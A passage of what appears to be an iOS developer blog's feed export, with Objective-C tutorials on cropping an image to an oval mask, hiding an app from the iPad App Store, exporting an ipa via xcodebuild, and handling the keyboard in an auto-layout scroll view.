initWithFrame:<span class="keyword">self</span>.view.bounds];</span><br><span class="line">    overlayView.autoresizingMask = <span class="built_in">UIViewAutoresizingFlexibleTopMargin</span> | <span class="built_in">UIViewAutoresizingFlexibleHeight</span> | <span class="built_in">UIViewAutoresizingFlexibleBottomMargin</span>;</span><br><span class="line">    overlayView.userInteractionEnabled = <span class="literal">NO</span>;</span><br><span class="line">    [<span class="keyword">self</span>.view addSubview:overlayView];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2.</span></span><br><span class="line">    _maskImageView = [[<span class="built_in">UIImageView</span> alloc] initWithImage:[<span class="built_in">UIImage</span> imageNamed:<span class="string">@&quot;sungoku&quot;</span>]];</span><br><span class="line">    _maskImageView.center = <span class="built_in">CGPointMake</span>(<span class="built_in">CGRectGetWidth</span>(<span class="keyword">self</span>.view.frame) / <span class="number">2.0</span>, (<span class="built_in">CGRectGetHeight</span>(<span class="keyword">self</span>.view.frame) / <span class="number">2.0</span>) - <span class="number">30</span>);</span><br><span class="line">    [<span class="keyword">self</span>.view addSubview:_maskImageView];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.b.</span></span><br><span class="line">    <span class="built_in">UIBezierPath</span> *overlayPath = [<span class="built_in">UIBezierPath</span> bezierPathWithRect:overlayView.bounds];</span><br><span class="line">    <span class="built_in">UIBezierPath</span> *transparentPath = [<span class="built_in">UIBezierPath</span> bezierPathWithOvalInRect:<span class="built_in">CGRectMake</span>(<span class="built_in">CGRectGetMinX</span>(_maskImageView.frame) + <span class="built_in">CGRectGetMinX</span>(kCropFrame), <span class="built_in">CGRectGetMinY</span>(_maskImageView.frame) + <span class="built_in">CGRectGetMinY</span>(kCropFrame), <span class="built_in">CGRectGetWidth</span>(kCropFrame), <span class="built_in">CGRectGetHeight</span>(kCropFrame))];</span><br><span class="line">    [overlayPath appendPath:transparentPath];</span><br><span class="line">    [overlayPath setUsesEvenOddFillRule:<span class="literal">YES</span>];</span><br><span class="line">    <span class="built_in">CAShapeLayer</span> *fillLayer = [<span class="built_in">CAShapeLayer</span> layer];</span><br><span class="line">    fillLayer.path = overlayPath.CGPath;</span><br><span class="line">    fillLayer.fillRule = kCAFillRuleEvenOdd;</span><br><span class="line">    fillLayer.fillColor = [<span class="built_in">UIColor</span> colorWithWhite:<span class="number">0</span> alpha:<span class="number">0.5</span>].CGColor;</span><br><span class="line">    [overlayView.layer addSublayer:fillLayer];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)didReceiveMemoryWarning &#123;</span><br><span class="line">    [<span class="variable language_">super</span> didReceiveMemoryWarning];</span><br><span class="line">    <span class="comment">// Dispose of any resources that can be recreated.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - helper</span></span><br><span class="line"><span class="comment">// 4.</span></span><br><span class="line">- (<span class="built_in">UIImage</span> *)image:(<span class="built_in">UIImage</span> *)image cropInRect:(<span class="built_in">CGRect</span>)rect</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">CGImageRef</span> imageRef = <span class="built_in">CGImageCreateWithImageInRect</span>([image <span class="built_in">CGImage</span>], rect);</span><br><span class="line">    <span class="built_in">UIImage</span> *cropped = [<span class="built_in">UIImage</span> imageWithCGImage:imageRef];</span><br><span class="line">    <span class="built_in">CGImageRelease</span>(imageRef);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> cropped;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - event</span></span><br><span class="line">- (<span class="type">void</span>)closeTapped:(<span class="type">id</span>)sender</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="keyword">self</span> dismissViewControllerAnimated:<span class="literal">YES</span> completion:<span class="literal">nil</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)doneTapped:(<span class="type">id</span>)sender</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 5.</span></span><br><span class="line">    <span class="built_in">CGRect</span> placeholderInGlobalSpace = [<span class="keyword">self</span>.view convertRect:kCropFrame fromView:_maskImageView];</span><br><span class="line">    <span class="comment">// 6.</span></span><br><span class="line">    <span class="built_in">CGRect</span> selectedRectInFaceImage = [<span class="keyword">self</span>.view convertRect:placeholderInGlobalSpace toView:_faceImageView];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 7.</span></span><br><span class="line">    <span class="built_in">UIImage</span> *croppedImage = [<span class="keyword">self</span> image:_faceImage cropInRect:selectedRectInFaceImage];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ([_delegate respondsToSelector:<span class="keyword">@selector</span>(cropViewControllerDidCroppedImage:)]) &#123;</span><br><span class="line">        [_delegate cropViewControllerDidCroppedImage:croppedImage];</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="keyword">self</span> dismissViewControllerAnimated:<span class="literal">YES</span> completion:<span class="literal">nil</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - UIScrollViewDelegate</span></span><br><span class="line"><span class="comment">// 8.</span></span><br><span class="line">- (<span class="built_in">UIView</span> *)viewForZoomingInScrollView:(<span class="built_in">UIScrollView</span> *)faceScrollView</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> _faceImageView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Create an <code>UIImageView</code> and attach it to a <code>UIScrollView</code>, this is to enable the zooming</li><li>Put a mask on top of the <code>scrollView</code></li><li>a) Overlay is a semi-transparent area to gray out the main image<br>b) Mask out the middle area <em>(the area that we’re going to crop)</em></li><li>Create a helper function for cropping image</li><li>Since both the <strong>mask</strong> &amp; the <strong>main image</strong> are not sibling, thus have to convert their position to base on the root view</li><li>After got the <code>frame</code> of the mask relative to the root view, then get the frame relative to the main image view</li><li>Crop the image base on the rectangle we got just now</li><li>For zooming purpose, is a delegate method from <code>UIScrollView</code></li></ol><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;CropViewController.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="comment">// 1.</span></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> () &lt;<span class="title">UIActionSheetDelegate</span>, <span class="title">UIImagePickerControllerDelegate</span>, <span class="title">UINavigationControllerDelegate</span>, <span class="title">CropViewControllerDelegate</span>&gt;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - CropViewControllerDelegate</span></span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line">- (<span class="type">void</span>)cropViewControllerDidCroppedImage:(<span class="built_in">UIImage</span> *)image</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Solution 1: crop the UIImage to oval shape</span></span><br><span class="line">    <span class="built_in">UIBezierPath</span> *path = [<span class="built_in">UIBezierPath</span> bezierPathWithOvalInRect:<span class="built_in">CGRectMake</span>(<span class="number">0</span>, <span class="number">0</span>, image.size.width, image.size.height)];</span><br><span class="line">    <span class="comment">//you have to account for the x and y values of your UIBezierPath rect</span></span><br><span class="line">    <span class="built_in">UIGraphicsBeginImageContext</span>(image.size);</span><br><span class="line">    <span class="comment">//this gets the graphic context</span></span><br><span class="line">    <span class="built_in">CGContextRef</span> context = <span class="built_in">UIGraphicsGetCurrentContext</span>();</span><br><span class="line">    <span class="comment">//you can stroke and/or fill</span></span><br><span class="line">    <span class="built_in">CGContextSetFillColorWithColor</span>(context, [<span class="built_in">UIColor</span> colorWithPatternImage:image].CGColor);</span><br><span class="line">    [path fill];</span><br><span class="line">    <span class="comment">//now get the image from the context</span></span><br><span class="line">    <span class="built_in">UIImage</span> *bezierImage = <span class="built_in">UIGraphicsGetImageFromCurrentImageContext</span>();</span><br><span class="line">    <span class="built_in">UIGraphicsEndImageContext</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Solution 2: the image remain in rectangle, mask the UIImageView</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    UIBezierPath *path = [UIBezierPath bezierPathWithOvalInRect:_cropImageView.bounds];</span></span><br><span class="line"><span class="comment">    CAShapeLayer *maskLayer = [CAShapeLayer layer];</span></span><br><span class="line"><span class="comment">    maskLayer.path = path.CGPath;</span></span><br><span class="line"><span class="comment">    _cropImageView.layer.mask = maskLayer;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// save to library</span></span><br><span class="line">    <span class="comment">// uncomment it if you want to see the effect of the image after cropping</span></span><br><span class="line">    <span class="comment">// UIImageWriteToSavedPhotosAlbum(image, nil, nil, nil);</span></span><br><span class="line">    </span><br><span class="line">    _cropImageView.image = bezierImage;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - UIImagePickerControllerDelegate</span></span><br><span class="line"><span class="comment">// 3.</span></span><br><span class="line">- (<span class="type">void</span>)imagePickerController:(<span class="built_in">UIImagePickerController</span> *)picker didFinishPickingMediaWithInfo:(<span class="built_in">NSDictionary</span> *)info</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="keyword">self</span> dismissViewControllerAnimated:<span class="literal">YES</span> completion:^&#123;</span><br><span class="line">        </span><br><span class="line">        CropViewController *controller = [[CropViewController alloc] init];</span><br><span class="line">        controller.delegate = <span class="keyword">self</span>;</span><br><span class="line">        controller.faceImage = info[<span class="built_in">UIImagePickerControllerEditedImage</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">UINavigationController</span> *navController = [[<span class="built_in">UINavigationController</span> alloc] initWithRootViewController:controller];</span><br><span class="line">        [<span class="keyword">self</span> presentViewController:navController animated:<span class="literal">YES</span> completion:<span class="literal">nil</span>];</span><br><span class="line">        </span><br><span class="line">    &#125;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)imagePickerControllerDidCancel:(<span class="built_in">UIImagePickerController</span> *)picker</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="keyword">self</span> dismissViewControllerAnimated:<span class="literal">YES</span> completion:<span class="literal">nil</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Conform to those protocols</li><li>The delegate method of after cropping the image. There are 2 solution here:</li></ol><p><strong>Solution 1</strong> is to crop the actual image to oval shape; where <strong>Solution 2</strong><br>remain the image as rectangle, but mask out the <code>UIImageView</code> to display it as<br>oval shape. <em>(you uncomment the line and save it to see what is the difference)</em><br>3. The delegate method after taking photo, make sure pass the image to the crop view controller.</p><p>Test it, you can adjust the main image.</p><p><img src="/images/posts/2014-12-09-ios-crop-image-based-on-a-mask/adjust-image.png" alt="Adjust the image to the mask"></p><p>Then the final result will be like</p><p><img src="/images/posts/2014-12-09-ios-crop-image-based-on-a-mask/result.png" alt="The final result"></p><p>You can download the sample project in my <a href="https://github.com/jslim89/CropImageObjc-Example">GitHub repo</a>.</p><p><em>References:</em></p><ul><li><em><a href="https://stackoverflow.com/questions/23779116/how-to-draw-oval-shape-in-uiimageview/23779728#23779728">how to draw oval shape in UIImageview</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I have a mask here &lt;em&gt;(the Sun Goku hair)&lt;/em&gt;, and I want to put a face to this mask.&lt;/p&gt;
&lt;p&gt;&lt;img</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
    <category term="objective-c" scheme="http://jslim.net/tags/objective-c/"/>
    
  </entry>
  
  <entry>
    <title>iOS disable support for iPad - hide from iPad AppStore</title>
    <link href="http://jslim.net/blog/2014/11/18/ios-disable-support-for-ipad-hide-from-ipad-appstore/"/>
    <id>http://jslim.net/blog/2014/11/18/ios-disable-support-for-ipad-hide-from-ipad-appstore/</id>
    <published>2014-11-18T02:38:41.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’m sure you know about Whatsapp. Whatsapp was not available in iPad AppStore.<br>To achieve this, change <strong>Info.plist</strong> file, right-click -&gt; Open as -&gt; Source Code</p><p>Then search for <code>UIRequiredDeviceCapabilities</code>, most probably you will see</p><p><strong>Info.plist</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>UIRequiredDeviceCapabilities<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>armv7<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>telephony<span class="tag">&lt;/<span class="name">string</span>&gt;</span> <span class="comment">&lt;!-- ADD THIS LINE --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br></pre></td></tr></table></figure><p>It means this app only support for those device which can <strong>call</strong>.</p><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/26302092/how-to-hide-an-iphone-app-from-the-ipads-appstore/26302371#26302371">How to hide an iPhone App from the iPad’s AppStore</a></em></li><li><em><a href="https://developer.apple.com/library/ios/documentation/DeviceInformation/Reference/iOSDeviceCompatibility/DeviceCompatibilityMatrix/DeviceCompatibilityMatrix.html">Device Compatibility</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’m sure you know about Whatsapp. Whatsapp was not available in iPad AppStore.&lt;br&gt;To achieve this, change &lt;strong&gt;Info.plist&lt;/strong&gt;</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>iOS - export to ipa thru command line</title>
    <link href="http://jslim.net/blog/2014/11/13/ios-export-to-ipa-thru-command-line/"/>
    <id>http://jslim.net/blog/2014/11/13/ios-export-to-ipa-thru-command-line/</id>
    <published>2014-11-13T20:01:08.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Recently I have come across an issue which Xcode 6 keep crashing when exporting ipa or validate the app.<br>I got no choice but have to export the ipa on command line.</p><h3 id="1-Clearn-the-project"><a href="#1-Clearn-the-project" class="headerlink" title="1. Clearn the project"></a>1. Clearn the project</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xcodebuild clean -<span class="keyword">project</span> <span class="regexp">/path/</span>to/<span class="keyword">project</span>.xcodeproj -configuration Release -alltargets</span><br></pre></td></tr></table></figure><h3 id="2-Create-archive"><a href="#2-Create-archive" class="headerlink" title="2. Create archive"></a>2. Create archive</h3><p><img src="/images/posts/2014-11-14-ios-export-to-ipa-thru-command-line/scheme.png" alt="Xcode - Scheme"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xcodebuild archive -<span class="keyword">project</span> <span class="regexp">/path/</span>to<span class="regexp">/project.xcodeproj -scheme &quot;Scheme name&quot; -archivePath /</span>path<span class="regexp">/to/</span>output</span><br></pre></td></tr></table></figure><p>See the image above, the scheme name you can refer to Xcode project.</p><p>E.g. <strong>Warranty Reminder</strong></p><h3 id="3-Export-the-archive-to-ipa"><a href="#3-Export-the-archive-to-ipa" class="headerlink" title="3. Export the archive to ipa"></a>3. Export the archive to ipa</h3><p><img src="/images/posts/2014-11-14-ios-export-to-ipa-thru-command-line/xcode.png" alt="Xcode - Build Settings"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xcodebuild -exportArchive -archivePath <span class="regexp">/path/</span>to<span class="regexp">/output.xcarchive -exportPath /</span>path<span class="regexp">/to/</span>output -exportFormat ipa -exportProvisioningProfile <span class="string">&quot;Provisioning Profile Name&quot;</span></span><br></pre></td></tr></table></figure><p>Regarding the provisioning profile, follow exactly the same as what you see in Xcode.</p><p>E.g. <strong>iOSTeam Provisioning Profile: com.jslim89.Warranty-Reminder</strong></p><p>Note that the output file name without the <strong>ipa</strong> extension.</p><p>You’re done.</p><p>I have make this into a shell script, you can <a href="/attachments/posts/2014-11-14-ios-export-to-ipa-thru-command-line/export.sh">download here</a>.</p><p>Usage: Just edit the file, instruction is inside. Then run in your terminal</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ chmod ugo+x ex<span class="keyword">port</span>.sh</span><br><span class="line">$ ./ex<span class="keyword">port</span>.sh</span><br></pre></td></tr></table></figure><p><em>References:</em></p><ul><li><em><a href="http://www.thecave.com/2014/09/16/using-xcodebuild-to-export-a-ipa-from-an-archive/">Using xcodebuild To Export a .ipa From an Archive</a></em></li><li><em><a href="http://stackoverflow.com/questions/4328501/how-to-read-plist-information-bundle-id-from-a-shell-script/4330902#4330902">How to read plist information (bundle id) from a shell script</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Recently I have come across an issue which Xcode 6 keep crashing when exporting ipa or validate the app.&lt;br&gt;I got no choice but have to</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>UIScrollView with auto-layout solution for UITextField (keyboard)</title>
    <link href="http://jslim.net/blog/2014/11/10/uiscrollview-with-auto-layout-solution-for-uitextfield-keyboard/"/>
    <id>http://jslim.net/blog/2014/11/10/uiscrollview-with-auto-layout-solution-for-uitextfield-keyboard/</id>
    <published>2014-11-10T05:26:32.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I believe there are many people are facing this problem. Last time my approach was to change the the <code>scrollView</code>‘s <code>contentSize</code> upon keyboard appear, and restore to normal when keyboard dismiss.</p><p>Now the problem in auto layout of <code>scrollView</code> was the <code>contentSize</code> is based on it’s subviews. I have figured out a way to do that</p><p>In <strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> ()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>) <span class="built_in">UIScrollView</span> *scrollView;</span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>) <span class="built_in">UITextField</span> *textField;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">TSPromotionVoucherFormViewController</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1.</span></span><br><span class="line">    <span class="built_in">UIView</span> *_dummyView;</span><br><span class="line">    <span class="built_in">NSLayoutConstraint</span> *_dummyViewHeightConstraint;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)viewDidLoad &#123;</span><br><span class="line">    [<span class="variable language_">super</span> viewDidLoad];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2.</span></span><br><span class="line">    _scrollView = [[<span class="built_in">UIScrollView</span> alloc] init];</span><br><span class="line">    _scrollView.translatesAutoresizingMaskIntoConstraints = <span class="literal">NO</span>;</span><br><span class="line">    [<span class="keyword">self</span>.view addSubview:_scrollView];</span><br><span class="line">    </span><br><span class="line">    _dummyView = [[<span class="built_in">UIView</span> alloc] init];</span><br><span class="line">    _dummyView.translatesAutoresizingMaskIntoConstraints = <span class="literal">NO</span>;</span><br><span class="line">    _dummyView.backgroundColor = [<span class="built_in">UIColor</span> clearColor];</span><br><span class="line">    [_scrollView addSubview:_dummyView];</span><br><span class="line">    </span><br><span class="line">    _textField = [[<span class="built_in">UITextField</span> alloc] init];</span><br><span class="line">    _textField.translatesAutoresizingMaskIntoConstraints = <span class="literal">NO</span>;</span><br><span class="line">    _textField.placeholder = <span class="string">@&quot;Dummy text&quot;</span>;</span><br><span class="line">    [_scrollView addSubview:_textField];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3.</span></span><br><span class="line">    <span class="built_in">NSDictionary</span> *viewsDictionary = <span class="built_in">NSDictionaryOfVariableBindings</span>(_scrollView</span><br><span class="line">                                                                   , _dummyView</span><br><span class="line">                                                                   , _textField);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">NSDictionary</span> *matrics = @&#123;<span class="string">@&quot;inputMargin&quot;</span>: @(<span class="number">20</span>), <span class="string">@&quot;textHeight&quot;</span>: @(<span class="number">44</span>)&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">NSArray</span> *constraints = [<span class="built_in">NSLayoutConstraint</span></span><br><span class="line">                            constraintsWithVisualFormat:<span class="string">@&quot;V:|[_scrollView]|&quot;</span></span><br><span class="line">                            options:<span class="number">0</span></span><br><span class="line">                            metrics:<span class="literal">nil</span></span><br><span class="line">                            views:viewsDictionary];</span><br><span class="line">    [<span class="keyword">self</span>.view addConstraints:constraints];</span><br><span class="line"></span><br><span class="line">    constraints = [<span class="built_in">NSLayoutConstraint</span></span><br><span class="line">                   constraintsWithVisualFormat:<span class="string">@&quot;|[_scrollView]|&quot;</span></span><br><span class="line">                   options:<span class="number">0</span></span><br><span class="line">                   metrics:<span class="literal">nil</span></span><br><span class="line">                   views:viewsDictionary];</span><br><span class="line">    [<span class="keyword">self</span>.view addConstraints:constraints];</span><br><span class="line"></span><br><span class="line">    constraints = [<span class="built_in">NSLayoutConstraint</span></span><br><span class="line">                   constraintsWithVisualFormat:<span class="string">@&quot;V:|-40-[_textField(textHeight)]-5-[_dummyView]-5-|&quot;</span></span><br><span class="line">                   options:<span class="number">0</span></span><br><span class="line">                   metrics:matrics <span class="comment">// remember to pass in the matrics if you want to use the &quot;variables&quot;</span></span><br><span class="line">                   views:viewsDictionary];</span><br><span class="line">    [_scrollView addConstraints:constraints];</span><br><span class="line">    constraints = [<span class="built_in">NSLayoutConstraint</span></span><br><span class="line">                   constraintsWithVisualFormat:<span class="string">@&quot;|-inputMargin-[textField]-inputMargin-|&quot;</span></span><br><span class="line">                   options:<span class="number">0</span></span><br><span class="line">                   metrics:matrics</span><br><span class="line">                   views:viewsDictionary];</span><br><span class="line">    [_scrollView addConstraints:constraints];</span><br><span class="line">    constraints = [<span class="built_in">NSLayoutConstraint</span></span><br><span class="line">                   constraintsWithVisualFormat:<span class="string">@&quot;|-inputMargin-[_dummyView]-inputMargin-|&quot;</span></span><br><span class="line">                   options:<span class="number">0</span></span><br><span class="line">                   metrics:matrics</span><br><span class="line">                   views:viewsDictionary];</span><br><span class="line">    [_scrollView addConstraints:constraints];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4.</span></span><br><span class="line">    _dummyViewHeightConstraint = [<span class="built_in">NSLayoutConstraint</span> constraintWithItem:_dummyView</span><br><span class="line">                                                              attribute:<span class="built_in">NSLayoutAttributeHeight</span></span><br><span class="line">                                                              relatedBy:<span class="built_in">NSLayoutRelationEqual</span></span><br><span class="line">                                                                 toItem:<span class="literal">nil</span></span><br><span class="line">                                                              attribute:<span class="built_in">NSLayoutAttributeNotAnAttribute</span></span><br><span class="line">                                                             multiplier:<span class="number">1.0</span>f</span><br><span class="line">                                                               constant:<span class="number">0</span>];</span><br><span class="line">    [_dummyView addConstraint:_dummyViewHeightConstraint];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5.</span></span><br><span class="line">    [[<span class="built_in">NSNotificationCenter</span> defaultCenter] addObserver:<span class="keyword">self</span> selector:<span class="keyword">@selector</span>(keyboardWillShow:) name:<span class="built_in">UIKeyboardWillShowNotification</span> object:<span class="literal">nil</span>];</span><br><span class="line">    [[<span class="built_in">NSNotificationCenter</span> defaultCenter] addObserver:<span class="keyword">self</span> selector:<span class="keyword">@selector</span>(keyboardWillHide:) name:<span class="built_in">UIKeyboardWillHideNotification</span> object:<span class="literal">nil</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - keyboard notification</span></span><br><span class="line">- (<span class="type">void</span>)keyboardWillShow:(<span class="built_in">NSNotification</span> *)notification</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 6.</span></span><br><span class="line">    <span class="built_in">NSDictionary</span> *userInfo = [notification userInfo];</span><br><span class="line">    <span class="built_in">CGSize</span> keyboardSize = [[userInfo objectForKey:<span class="built_in">UIKeyboardFrameBeginUserInfoKey</span>] <span class="built_in">CGRectValue</span>].size;</span><br><span class="line">    </span><br><span class="line">    [_dummyView removeConstraint:_dummyViewHeightConstraint];</span><br><span class="line">    </span><br><span class="line">    _dummyViewHeightConstraint = [<span class="built_in">NSLayoutConstraint</span> constraintWithItem:_dummyView</span><br><span class="line">                                              attribute:<span class="built_in">NSLayoutAttributeHeight</span></span><br><span class="line">                                              relatedBy:<span class="built_in">NSLayoutRelationEqual</span></span><br><span class="line">                                                 toItem:<span class="literal">nil</span></span><br><span class="line">                                              attribute:<span class="built_in">NSLayoutAttributeNotAnAttribute</span></span><br><span class="line">                                             multiplier:<span class="number">1.0</span>f</span><br><span class="line">                                               constant:keyboardSize.height];</span><br><span class="line">    [_dummyView addConstraint:_dummyViewHeightConstraint];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span 